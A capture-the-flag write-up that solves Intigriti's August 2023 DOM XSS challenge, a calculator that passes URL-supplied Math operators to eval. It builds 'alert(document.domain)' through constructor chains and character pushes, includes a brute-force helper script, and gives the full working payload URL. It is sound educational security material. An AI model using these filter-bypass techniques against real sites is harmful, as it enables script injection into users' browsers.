![Challenge Banner](./imgs/intigriti_challenge_banner.jpeg)

<div style="text-align: center;"><h1>Intigriti's August XSS challenge 0823<br>By <a href="https://twitter.com/aszx87410" target="_blank" style="color: red;">huli</a></h1></div>



## Introduction

This weekend, I was chilling at my friends (shout out to him <a href="https://twitter.com/MoatezSlimen" target="_blank">Moatez Ben Slimen</a>) house scrolling twitter until I encountered this Intigriti challenge. It's been a long time since I played one and I've got the CTF fever so I couldn't ignore the challenge. I took his computer and started working on the challenge right away :rofl:. This is the writeup for Intigriti's August XSS challenge, a great challenge made by the great <a href="https://twitter.com/aszx87410" target="_blank" style="font-weight: bold; color: red;">huli</a>.

## Overview

### General Overview

The challenge goal was to use <a href="https://portswigger.net/web-security/cross-site-scripting/dom-based" target="_blank">DOM XSS</a> to hack the `Pure Functional Math Calculator` as they called it in the challenge. Here is an overview of the challenge description and goal. 

![Description Part 1](./imgs/desc1.png)

![Description Part 2](./imgs/desc2.png)

So our goal is to pop an alert containing the `document.domain`. Here is the calculator.

![The Pure Functional Math Calculator](./imgs/calc_overview.png)

There is no input for numbers, only trigonometric functions and the use of `Math.random()` function which returns some random numbers. There is also an interesting button the `share` button that once we click on it will alert this:

![Share PopUp](./imgs/share_alert.png)

And the page seems to refresh to the new link https://challenge-0823.intigriti.io/challenge/index.html?q=Math.random. And this link is just containing the name of the function we just called in the calculator in the above pictures. I guess it's time to take at look at the source code.

```js
<script>
      (function(){
        name = 'Pure Functional Math Calculator'
        let next
        Math.random = function () {
          if (!this.seeds) {
            this.seeds = [0.62536, 0.458483, 0.544523, 0.323421, 0.775465]
            next = this.seeds[new Date().getTime() % this.seeds.length]
          }
          next = next * 1103515245 + 12345
          return (next / 65536) % 32767
        }
        console.assert(Math.random() > 0)

        const result = document.querySelector('.result')
        const stack = document.querySelector('.stack-block')
        let operators = []

        document.querySelector('.pad').addEventListener('click', handleClick)

        let qs = new URLSearchParams(window.location.search)
        if (qs.get('q')) {
          const ops = qs.get('q').split(',')
          if (ops.length >= 100) {
            alert('Max length of array is 99, got:' + ops.length)
            return init()
          }

          for(let op of ops) {
            if (!op.startsWith('Math.')) {
              alert(`Operator should start with Math.: ${op}`)
              return init()
            }

            if (!/^[a-zA-Z0-9.]+$/.test(op)) {
              alert(`Invalid operator: ${op}`)
              return init()
            }
          }

          for(let op of ops) {
            addOperator(op)
          }

          calculateResult()
        } else {
          init()
        }

        function init() {
          addOperator('Math.random')
        }

        function addOperator(name) {
          result.innerText = `${name}(${result.innerText})`
          operators.push(name)

          let div = document.createElement('div')
          div.textContent = `${operators.length}. ${name}`
          stack.prepend(div)
        }

        function calculateResult() {
          result.innerText = eval(result.innerText)
        }

        function handleClick(e) {
          let className = e.target.className
          let text = e.target.innerText
          
          if (className === 'btn-fn') {
            addOperator(`Math.${text}`)
          } else if (className === 'btn-ac') {
            result.innerText = 'Math.random()';
            stack.innerHTML = '<div>1. Math.random</div>'
            operators = ['Math.random']
          } else if (className === 'btn-share'){
            alert('Please copy the URL!')
            location.search = '?q=' + operators.join(',')
          } else if (className === 'btn-equal') {
            calculateResult()
          }
        }
      })()
</script>
```

This is the only important part in the source code it contains all the JS code that is handling what's happening on the calculator.

The first thing that caught my eyes is the use of eval to calculate all the stuff.

```js
function calculateResult() {
          result.innerText = eval(result.innerText)
}
```

![3angour EVAL](./imgs/3angour_eval.jpg)

The `Math.random` seems to be overwritten by another function.

```js
Math.random = function () {
          if (!this.seeds) {
            this.seeds = [0.62536, 0.458483, 0.544523, 0.323421, 0.775465]
            next = this.seeds[new Date().getTime() % this.seeds.length]
          }
          next = next * 1103515245 + 12345
          return (next / 65536) % 32767
}
```

`this` keyword in JS refers to an object. It depends on how it's being used to know which object it's referring to. Here is a list of cases.

| In an object method, `this` refers to the object.            |
| ------------------------------------------------------------ |
| Alone, `this` refers to the **global object**.               |
| In a function, `this` refers to the **global object**.       |
| In a function, in strict mode, `this` is `undefined`.        |
| In an event, `this` refers to the **element** that received the event. |
| Methods like `call()`, `apply()`, and `bind()` can refer `this` to **any object**. |

In our case it's the first case of use, so we are referring to the `Math` object in JS. The custom function is just initializing a <a href="https://en.wikipedia.org/wiki/Random_seed" target="_blank">seed</a> array to create the random numbers. Keep in mind that this seed array is now part of the `Math` object, so we could access it using `Math.seeds`. Then we have this part.

```js
let qs = new URLSearchParams(window.location.search)
        if (qs.get('q')) {
          const ops = qs.get('q').split(',')
          if (ops.length >= 100) {
            alert('Max length of array is 99, got:' + ops.length)
            return init()
          }

          for(let op of ops) {
            if (!op.startsWith('Math.')) {
              alert(`Operator should start with Math.: ${op}`)
              return init()
            }

            if (!/^[a-zA-Z0-9.]+$/.test(op)) {
              alert(`Invalid operator: ${op}`)
              return init()
            }
}
```

This part is taking content of the `q` parameter from the GET parameters, then it's splitting it with a comma (`,`) and checking if the generated array length should be smaller or equal to 99 also it's checking that each member of the array starts with the string `Math.` and that it only contains alphanumeric and `.` characters. If it passes all these checks then we are good to go and the function is added to the calculator. Here is an example of a link: https://challenge-0823.intigriti.io/challenge/index.html?q=Math.random,Math.tan,Math.floor. We should also note that the functions we put in separated by commas are then put in the form of `f1(f2(f3(...)))` according to these part of the code.

```js
function addOperator(name) {
          result.innerText = `${name}(${result.innerText})`
          operators.push(name)

          let div = document.createElement('div')
          div.textContent = `${operators.length}. ${name}`
          stack.prepend(div)
}
```

Having this information in hand, let's dive into solving the challenge.

## Solution

### My Thoughts

Having the fact that we could only have our payload in the form `f1(f2(f3(...)))` is the funny part. My first thought was creating an anonymous function with the <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Function/Function" target="_blank">Function() constructor</a> in javascript which is ~somewhat equivalent to the <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/eval" target="_blank">eval()</a> function in javascript with

```js
Function("alert(document.domain)")
```

and then calling it to pop the alert. But do we access the `Function()` with the constraints we have? Well every object in javascript has a constructor and that constructor might also have another constructor to create the final object. If you play with the developers tools console in chrome you could get what you want. Here is an example escalating from the `Math` object to the `Function()`.

![Dev Tools Escalate To Function](./imgs/escalate_to_function.png)

You see the constructor of the `Math` object is `Object` function and since it's a function then it's constructor would be our `Function()` We could've also done something like

```js
Math.abs.constructor
```

Any function would have that `Function` as it's constructor I guess.

Since we could only use the form `f1(f2)` we need some other function that will call our anonymous created function. We have bunch of these in javascript, but in our case we are limited. We have an example of a function that would call another function is the <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Array/sort" target="_blank">sort()</a> array method. How do we get this you would say? Well remember we have the seeds array integrated with the `Math` Object so we could just do `Math.seeds.sort` to access to this method. An example of a payload would be then

```js
Math.seeds.sort(Math.constructor.constructor("alert(document.domain)"))
```

Executing this from the chrome Dev Tools we will pop an alert.

![PopUp Alert From DevTools](./imgs/pop_alert_dev_tools.png)

Inputting that into the calculator would be of the form `?q=Math.constructor.constructor,Math.seeds.sort`. but now the real problem is how to create the string `alert(document.domain)` to pass it as an argument to the `Function()`.

### How to form the string we want then?

We have some math functions that we could use to form some integers that might be useful. You ask how is this going to be useful? A thought that came to my mind after some time, and by knowing that there are some available strings that we could use we could get the desired characters with the String method `charAt` and generated the integer for the index. For example, `"ASDF".charAt(0)` would return the `A` character. **After having that character we could push it to the seeds array then we could join that array to form the string we want**. For example some JS object properties have names assigned to them. If we look at the `Math` object we could understand this fact.

![Name From Property](./imgs/name_prop.png)

You see the `abs` property in the `Math` Object have some other useful property that we could use inside of it like the name. Doing something like `Math.abs.name` returns the string `"abs"` then doing `Math.abs.name.charAt(0)` would return the `"a"` character which the first character we want in our payload. How do we get the 0 integer now? Well we could get the last float from the `seeds` array using <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Array/pop" target="_blank">pop</a> array method and then apply <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Math/floor" target="_blank">Math.floor()</a> on it to get `0`. The payload would be `Math.abs.name.charAt(Math.floor(Math.seeds.pop()))` and on the `q` param it would be `?q=Math.seeds.pop,Math.abs.name.charAt,Math.seeds.push` or even better testing this line of JS with the float as it is `0.77..` seemed to also return the same character since JS seems to convert float to integers by it's own.

![Weird JS 1](./imgs/weird_js_float_to_int.png)

That would make the payload even smaller to regret that we wouldn't bypass the 99 functions constraint. And finally we push it to the seeds array as we discussed earlier. Now calling the <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Array/push">push</a> at the end will return an integer which is the new length of the seeds array we pushed to.

![Push Return First Push A Char](./imgs/first_push_a_char.png)

It's 5 since we pop will return the last element + remove it from the array so it will become `[0.62536, 0.458483, 0.544523, 0.323421]` of length 4 then if we push the `a` it will be of length 5. The 5 is a big integer to count as an index and we have so many names which provide the characters we want to have ranging from indexes 1~4 maybe 5 usually but I don't know I just worked it out with the word names I see.

### How to get the 5 back to 0-4 range?

Let's say we want to get that 5 to 0 back as we have the `Math.log.name` will have the second character `l` as the character we want after the `a`. We want that cos/sin sometimes tan trigonometric functions will get something in the range [0,1] (tan() might have something greater sometimes).

![Trigonometry Circle](./imgs/trig_circle.png)

Counting in degrees, The `cos` and `sin` functions are coordinates of a point in the bounding line of a circle of radius=1. so the results are always in the range [0,1] the tan function might have greater results sometimes because tan(x) = sin(x) / cos(x) and you might have something like 0.7/0.5 for example which is going to be equal to 1.4 so it might be greater and might reach even greater results.

![Tan in Trigonometry Circle](./imgs/tan_trig_circle.png)



Alright having this in hand we could apply cos/sin on the result returned from the `push` to get a positive integer close in [0,1] if it was all negative we could give a try to tan since tan(x)=sin(x)/cos(x) and negative/negative = something positive. If all of them didn't get desired result then we could try and use other functions to get something close to what we want. So to get the `l` character, this is what I would apply first Math.cos on the 5 would return ~ 0.28366218546322625 and then Math.charAt on the Math.log.name. The payload is `?q=Math.seeds.pop,Math.abs.name.charAt,Math.seeds.push,Math.cos,Math.log.name.charAt` and don't forget to push this too. We repeat the same process till we form the word alert pushed to the seeds array. This is the payload to get the alert string pushed: `?q=Math.seeds.pop,Math.abs.name.charAt,Math.seeds.push,Math.cos,Math.log.name.charAt,Math.seeds.push,Math.cos,Math.exp.name.charAt,Math.seeds.push,Math.cos,Math.round.name.charAt,Math.seeds.push,Math.sin,Math.tan.name.charAt,Math.seeds.push`. We could execute it on the website calculator and verify with dev tools.

![First String Verification](./imgs/alert_pushed.png)

Nice! Now we have another problem we need to open parenthesis but I don't think (There might be a smarter way or it might have existed btw) there is an open parenthesis in one of the names that we have so what do we do now to generate non alphabetic characters?

### What about non alphabetic characters?

The only thing we could do is to use all the math functions we have in the `Math` object and try to get something in the range `[asciiCode(character), asciiCode(character)+1[` since as we said javascript will cast floats to integers by itself when referencing indices. Well for this one I thought of making a JS script that would bruteforce with all possible functions to generated a desired character then we could use `String.fromCharCode` to convert it to a character. Before starting to talk about the script, how do we access the <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/String/fromCharCode" target="_blank">fromCharCode</a> `String` method. `String` object is a constructor of any string. So we if access a string first then do `some_string.constructor` we would access to the `String` object from which we can call the `fromCharCode` method on the number we have. Also String.fromCharCode(97.111) is equivalent to String.fromCharCode(97) so it's also doing the cast here from float to int.

![fromCharCode Doing The Cast Too](./imgs/fromCharCode_cast.png)

We have bunch of strings we could access as we discussed earlier something like `Math.abs.name` then do `Math.abs.name.constructor.fromCharCode` this would return the method.

![Escalate To fromCharCode](./imgs/escalate_to_String_fromCharCode.png)

But my brain favorized using `Math.toString.name` instead of `Math.abs.name` don't ask me why :pensive:. Fine. Now into bruteforcing to get the numbers. Here is my Node.js bruteforce script.

```js
let funcs = [
	Math.abs,
	Math.acos,
	Math.acosh,
	Math.asin,
	Math.asinh,
	Math.atan,
	Math.atan2,
	Math.atanh,
	Math.cbrt,
	Math.ceil,
	Math.clz32,
	Math.cos,
	Math.cosh,
	Math.exp,
	Math.expm1,
	Math.floor,
	Math.fround,
	Math.hypot,
	Math.imul,
	Math.log,
	Math.log10,
	Math.log1p,
	Math.log2,
	Math.max,
	Math.min,
	Math.pow,
	Math.round,
	Math.sign,
	Math.sin,
	Math.sinh,
	Math.sqrt,
	Math.tan,
	Math.tanh,
	Math.trunc
];
let x;

for (a of funcs) {
	for (b of funcs) {
		for (c of funcs) {
			for (d of funcs) {
				x = a(b(c(d(Number(process.argv[2])))));
				if (x == Number(process.argv[3])) {
					console.log(`Math.${d.name},Math.${c.name},Math.${b.name},Math.${a.name}`);
					console.log(x);
					process.exit();
				}
			}
		}
	}
}

for (a of funcs) {
	for (b of funcs) {
		for (c of funcs) {
			for (d of funcs) {
				x = a(b(c(d(Math.sqrt(Number(process.argv[2]))))));
				if (x == Number(process.argv[3])) {
					console.log(`Math.${d.name},Math.${c.name},Math.${b.name},Math.${a.name}`);
					console.log(x);
					process.exit();
				}
			}
		}
	}
}
```

I just initialized an array containing all the needed Math functions and started 2 nested blocks of `for` loops the first one would just run a combination of 4 functions to see if we could get that number and the second block would try to minimize the number if the first block didn't work by calculating it's <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Math/sqrt" target="_blank">sqrt</a> and working with the result of the sqrt instead of the number it self making it smaller because sometimes the number it self would have a possible combination of 4 and might require you to make it 5 in order to get the number and sometimes even a combination of 5 is not possible. I chose 4 as a combination since 3 wouldn't have any possible ones and 5 is longer so 4 is ideal I don't remember if I really had to change it sometimes to 5 in order to get the right number but you could tell by looking at my final payload. Anyways, after pushing the last character in `"alert"` which is `t` the new length of the array became 9. To calculate any possible combination with 9 as the number we would apply functions on and the ascii code of "(" = 40 we run the script with the command `node solver.js 9 40`. This is the returned result:

![Script Generated Payload](./imgs/script_generated_payload.png)

To get 40 from the 9 we could use the payload `Math.clz32,Math.cosh,Math.log2,Math.ceil` which will execute in the order `Math.ceil(Math.log2(Math.cosh(Math.clz32(9))))`. Then we apply `String.fromCharCode`. So final payload for this character is `Math.clz32,Math.cosh,Math.log2,Math.ceil,Math.toString.name.constructor.fromCharCode,Math.seeds.push` and the character is pushed. After this the array length is going to be 10, we could repeat the same process to get `d` character by applying `tan` to it since `cos` and `sin` are negative yielding back `0.6483608274590866` and then where do we get the `d` from? Well we don't really need to only use the names of functions inside the `Math` object we could escalate to another object and use the names of functions there. Here I just escalated to the `Object` object and there is a property there called `defineProperties` in which we could get the `d` char.

![Firefox Object Properties](./imgs/firefox_object_props.png)

*I just used firefox here since chrome wouldn't let me for some reason look into the object properties and I didn't have that much time to figure out how to make it show them.*

 Alright the payload is then `Math.tan,Math.constructor.defineProperties.name.charAt,Math.seeds.push`. Some characters as I said before, don't have index 0 but a greater one like 1, 2, 3 or even 4. We could in this case function like `Math.log10` to get a number inside that range or `Math.log1p` you could just try them all until you get the desired number. For example we need the character `o`. When searching for it, I first found it in the `round` string with index = 1. And after pushing the last character, push returned 11. Applying log10 to 11 will return 1.04. And so on and so far, until you generate all needed characters. The script is used for the character `.` and `)` later and that's all.

These are the steps we executed till this point: https://challenge-0823.intigriti.io/challenge/index.html?q=Math.seeds.pop,Math.abs.name.charAt,Math.seeds.push,Math.cos,Math.log.name.charAt,Math.seeds.push,Math.cos,Math.exp.name.charAt,Math.seeds.push,Math.cos,Math.round.name.charAt,Math.seeds.push,Math.sin,Math.tan.name.charAt,Math.seeds.push,Math.clz32,Math.cosh,Math.log2,Math.ceil,Math.toString.name.constructor.fromCharCode,Math.seeds.push,Math.tan,Math.constructor.defineProperties.name.charAt,Math.seeds.push,Math.log10,Math.round.name.charAt,Math.seeds.push,Math.cos,Math.ceil.name.charAt,Math.seeds.push,Math.cos,Math.seeds.unshift.name.charAt,Math.seeds.push,Math.cos,Math.max.name.charAt,Math.seeds.push,Math.sin,Math.exp.name.charAt,Math.seeds.push,Math.log,Math.sin.name.charAt,Math.seeds.push,Math.tan,Math.sqrt.name.charAt,Math.seeds.push,Math.sqrt,Math.atan,Math.exp,Math.exp,Math.ceil,Math.toString.name.constructor.fromCharCode,Math.seeds.push,Math.sqrt,Math.round.name.charAt,Math.seeds.push,Math.log10,Math.round.name.charAt,Math.seeds.push,Math.sin,Math.max.name.charAt,Math.seeds.push,Math.tan,Math.abs.name.charAt,Math.seeds.push,Math.tanh,Math.sin.name.charAt,Math.seeds.push,Math.acosh,Math.round.name.charAt,Math.seeds.push,Math.sqrt,Math.clz32,Math.cosh,Math.log2,Math.ceil,Math.toString.name.constructor.fromCharCode,Math.seeds.push

### Joining The Array To Form The Payload String

After pushing the payload to seeds array, before joining it we need to get rid of the first numbers that are still existing in our array. You could see it with the Dev Tools if you lost track at this point when reading.

![Remaining Numbers](./imgs/remaining_nums_seeds.png)

We have 4 numbers that still exist at the beginning of the array. How do we get rid of them? we could use the <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Array/shift" target="_blank">shift()</a> array method which works like pop array method but in reverse returning the first element in the array and removing it from the array. Also it doesn't care about the passed argument and that's fine for us since we are passing it as an argument the number returned from the last called push method. Here is the seeds array, after running the shift method 4 times on the seeds array at the end of the current payload.

![Seeds Array At The End](./imgs/seeds_after_4_shifts.png)

Clean! These are the steps we executed till now: https://challenge-0823.intigriti.io/challenge/index.html?q=Math.seeds.pop,Math.abs.name.charAt,Math.seeds.push,Math.cos,Math.log.name.charAt,Math.seeds.push,Math.cos,Math.exp.name.charAt,Math.seeds.push,Math.cos,Math.round.name.charAt,Math.seeds.push,Math.sin,Math.tan.name.charAt,Math.seeds.push,Math.clz32,Math.cosh,Math.log2,Math.ceil,Math.toString.name.constructor.fromCharCode,Math.seeds.push,Math.tan,Math.constructor.defineProperties.name.charAt,Math.seeds.push,Math.log10,Math.round.name.charAt,Math.seeds.push,Math.cos,Math.ceil.name.charAt,Math.seeds.push,Math.cos,Math.seeds.unshift.name.charAt,Math.seeds.push,Math.cos,Math.max.name.charAt,Math.seeds.push,Math.sin,Math.exp.name.charAt,Math.seeds.push,Math.log,Math.sin.name.charAt,Math.seeds.push,Math.tan,Math.sqrt.name.charAt,Math.seeds.push,Math.sqrt,Math.atan,Math.exp,Math.exp,Math.ceil,Math.toString.name.constructor.fromCharCode,Math.seeds.push,Math.sqrt,Math.round.name.charAt,Math.seeds.push,Math.log10,Math.round.name.charAt,Math.seeds.push,Math.sin,Math.max.name.charAt,Math.seeds.push,Math.tan,Math.abs.name.charAt,Math.seeds.push,Math.tanh,Math.sin.name.charAt,Math.seeds.push,Math.acosh,Math.round.name.charAt,Math.seeds.push,Math.sqrt,Math.clz32,Math.cosh,Math.log2,Math.ceil,Math.toString.name.constructor.fromCharCode,Math.seeds.push,Math.seeds.shift,Math.seeds.shift,Math.seeds.shift,Math.seeds.shift

Now we have to join it using `Math.seeds.join`. Here is the result from Dev Tools.

![Wrong Join Seeds](./imgs/wrong_join_result_seeds.png)

Oops! We have them comma separated :disappointed:. So how to make it join without the comma? We know that `Math.seeds.join("")` with an empty string as an argument will join without the `,`.

![Seeds Empty String Join](./imgs/seeds_empty_string_join.png)

But I'm not sure if have some empty strings out there to use and we couldn't use String method to form it from a number. However converting converting an empty array to a string in JS will return an empty string!

 <div style="text-align: center;"><img src="./imgs/empty_string_from_array.png">
     
 </div>

But how do we get the empty array? We could just call <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Array/Array" target="_blank">Array</a> constructor with a 0 argument which means creating an empty array and then we could apply join with that empty array as argument. and in order to access to the `Array` constructor we could just access the seeds array and then it's constructor to get it. Also to get the 0, we could just run `Math.floor` since the returned number from the last shift is 0.62536 making it 0. This is the payload to do so: `Math.floor,Math.seeds.constructor,Math.seeds.join`.

The payload is: https://challenge-0823.intigriti.io/challenge/index.html?q=Math.seeds.pop,Math.abs.name.charAt,Math.seeds.push,Math.cos,Math.log.name.charAt,Math.seeds.push,Math.cos,Math.exp.name.charAt,Math.seeds.push,Math.cos,Math.round.name.charAt,Math.seeds.push,Math.sin,Math.tan.name.charAt,Math.seeds.push,Math.clz32,Math.cosh,Math.log2,Math.ceil,Math.toString.name.constructor.fromCharCode,Math.seeds.push,Math.tan,Math.constructor.defineProperties.name.charAt,Math.seeds.push,Math.log10,Math.round.name.charAt,Math.seeds.push,Math.cos,Math.ceil.name.charAt,Math.seeds.push,Math.cos,Math.seeds.unshift.name.charAt,Math.seeds.push,Math.cos,Math.max.name.charAt,Math.seeds.push,Math.sin,Math.exp.name.charAt,Math.seeds.push,Math.log,Math.sin.name.charAt,Math.seeds.push,Math.tan,Math.sqrt.name.charAt,Math.seeds.push,Math.sqrt,Math.atan,Math.exp,Math.exp,Math.ceil,Math.toString.name.constructor.fromCharCode,Math.seeds.push,Math.sqrt,Math.round.name.charAt,Math.seeds.push,Math.log10,Math.round.name.charAt,Math.seeds.push,Math.sin,Math.max.name.charAt,Math.seeds.push,Math.tan,Math.abs.name.charAt,Math.seeds.push,Math.tanh,Math.sin.name.charAt,Math.seeds.push,Math.acosh,Math.round.name.charAt,Math.seeds.push,Math.sqrt,Math.clz32,Math.cosh,Math.log2,Math.ceil,Math.toString.name.constructor.fromCharCode,Math.seeds.push,Math.seeds.shift,Math.seeds.shift,Math.seeds.shift,Math.seeds.shift,Math.floor,Math.seeds.constructor,Math.seeds.join

And the result is

![Final Steps To Get Final String](./imgs/steps_till_payload_string.png)

Now the only thing to do is to pass that string to the `Function()` we talked about earlier and call it using sort() array method.

### Joining it all together

Joining it all together, this is the last payload:

https://challenge-0823.intigriti.io/challenge/index.html?q=Math.seeds.pop,Math.abs.name.charAt,Math.seeds.push,Math.cos,Math.log.name.charAt,Math.seeds.push,Math.cos,Math.exp.name.charAt,Math.seeds.push,Math.cos,Math.round.name.charAt,Math.seeds.push,Math.sin,Math.tan.name.charAt,Math.seeds.push,Math.clz32,Math.cosh,Math.log2,Math.ceil,Math.toString.name.constructor.fromCharCode,Math.seeds.push,Math.tan,Math.constructor.defineProperties.name.charAt,Math.seeds.push,Math.log10,Math.round.name.charAt,Math.seeds.push,Math.cos,Math.ceil.name.charAt,Math.seeds.push,Math.cos,Math.seeds.unshift.name.charAt,Math.seeds.push,Math.cos,Math.max.name.charAt,Math.seeds.push,Math.sin,Math.exp.name.charAt,Math.seeds.push,Math.log,Math.sin.name.charAt,Math.seeds.push,Math.tan,Math.sqrt.name.charAt,Math.seeds.push,Math.sqrt,Math.atan,Math.exp,Math.exp,Math.ceil,Math.toString.name.constructor.fromCharCode,Math.seeds.push,Math.sqrt,Math.round.name.charAt,Math.seeds.push,Math.log10,Math.round.name.charAt,Math.seeds.push,Math.sin,Math.max.name.charAt,Math.seeds.push,Math.tan,Math.abs.name.charAt,Math.seeds.push,Math.tanh,Math.sin.name.charAt,Math.seeds.push,Math.acosh,Math.round.name.charAt,Math.seeds.push,Math.sqrt,Math.clz32,Math.cosh,Math.log2,Math.ceil,Math.toString.name.constructor.fromCharCode,Math.seeds.push,Math.seeds.shift,Math.seeds.shift,Math.seeds.shift,Math.seeds.shift,Math.floor,Math.seeds.constructor,Math.seeds.join,Math.constructor.constructor,Math.seeds.sort

And here our goal is achieved!

![Final Alert](./imgs/final_alert.png)

## Conclusion

This task was so fun to do ~~because I like javascript so much~~. Greetz to huli for making such a fun and nice quality challenge as usual. I surely made mistakes through out my first thoughts which made me loose some time but having the main idea and limiting it with the environment you're in and the constraints being applied will make you recover fast! Also having some experience with stuff like this will make you advance and think better. I hope you enjoyed reading the article and thanks for your time everyone!

You can contact me on:

- Twitter: https://twitter.com/t0m7r00z
- Discord: Iy3dMejri#1997
- LinkedIn: https://www.linkedin.com/in/iyed-mejri/
